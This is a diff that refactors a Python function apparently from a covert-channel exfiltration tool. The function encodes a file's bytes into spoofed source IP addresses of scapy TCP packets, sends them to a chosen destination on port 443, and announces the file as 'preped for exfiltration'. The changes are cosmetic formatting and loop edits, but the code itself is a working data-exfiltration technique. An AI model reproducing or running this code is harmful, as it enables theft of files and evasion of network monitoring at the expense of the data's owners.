@@ -31,20 +31,18 @@ def _send(file_path, to, sport=SPORT, dport=443):
     for i in _list2chunks(binary_array, 4):
         if len(i) < 4:
             if len(i) == 1:
-                ips_to_send.append("%s.255.255.255" % i[0])
+                ips_to_send.append(f"{i[0]}.255.255.255")
             if len(i) == 2:
-                ips_to_send.append("%s.%s.255.255" % (i[0], i[1]))
+                ips_to_send.append(f"{i[0]}.{i[1]}.255.255")
             if len(i) == 3:
-                ips_to_send.append("%s.%s.%s.255" % (i[0], i[1], i[2]))
+                ips_to_send.append(f"{i[0]}.{i[1]}.{i[2]}.255")
         else:
-            ips_to_send.append("%s.%s.%s.%s" % (i[0], i[1], i[2], i[3]))
+            ips_to_send.append(f"{i[0]}.{i[1]}.{i[2]}.{i[3]}")
 
     sys.stdout.write("File '%s' had been preped for exfiltration.\n" % (file_path))
-    i = 0
     sys.stdout.write("Total of %s data packets (+3 terminators).\n" % len(ips_to_send))
     percent = len(ips_to_send) / 100
-    for ip in ips_to_send:
-        i += 1
+    for i, ip in enumerate(ips_to_send, start=1):
         a = IP(src=ip, dst=to)
         b = a/TCP(sport=sport, dport=dport, seq=4545)
         send(b, verbose=False)
@@ -54,7 +52,7 @@ def _send(file_path, to, sport=SPORT, dport=443):
     sys.stdout.write("\n")
 
     # Terminating buffer
-    for i in range(0,2):
+    for _ in range(0,2):
         a = IP(src="255.255.255.255", dst=to)
         b = a/TCP(sport=sport, dport=dport)
         send(b, verbose=False)
